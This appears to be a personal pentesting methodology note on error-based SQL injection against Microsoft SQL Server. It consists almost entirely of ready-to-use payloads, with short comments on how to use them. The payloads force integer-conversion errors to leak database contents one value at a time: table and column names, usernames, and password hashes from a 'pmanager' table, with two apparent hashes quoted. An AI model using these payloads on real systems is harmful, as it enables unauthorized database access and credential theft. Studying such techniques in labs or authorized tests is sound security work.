(Note: In this case I could only really enumarate one datapoint at a time, so I had to do something like this to make it work)
', cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --
', cast((SELECT top 1 TABLE_NAME FROM master.information_schema.TABLES) as int)) --
', cast((SELECT top 1 username FROM users) as int)) --
', cast((SELECT top 1 username FROM users where username not in('eric')) as int)) --
', cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --

(Note: You can do it like this too. I might prefer this variation of syntax actually.)
1',CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES )))--
1',CONVERT(INT,(SELECT  top 1  COLUMN_NAME FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager')))--
1',CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES WHERE TABLE_NAME NOT IN ('pmanager'))))--
1',CONVERT(INT,(SELECT DISTINCT top 1 COLUMN_NAME FROM archive.information_schema.COLUMNS  WHERE TABLE_NAME='pmanager' AND column_name NOT IN ('alogin', 'id'))))
1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager)))--

 1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN ('7de6b6f0afadd89c3ed558da43930181'))))--
 
  1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN ('7de6b6f0afadd89c3ed558da43930181', '5b413fe170836079622f4131fe6efa2d'))))--
  
  etc etc... Again, we could only get one datapoint at a time, so doing it this way works.![unnamed_25b647a110814ef680a8ae9cc7353da6](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/Error%20based/Example/{{notename}}-202605011742.png)
![unnamed_cdbb63a585e84537831253d0d30a4f48](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/Error%20based/Example/{{notename}}-202605011742-1.png)
![unnamed_1dc17a99dc0842a894efc890ec62bc71](docs/Attachments/_Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/Error%20based/Example/{{notename}}-202605011743.png)
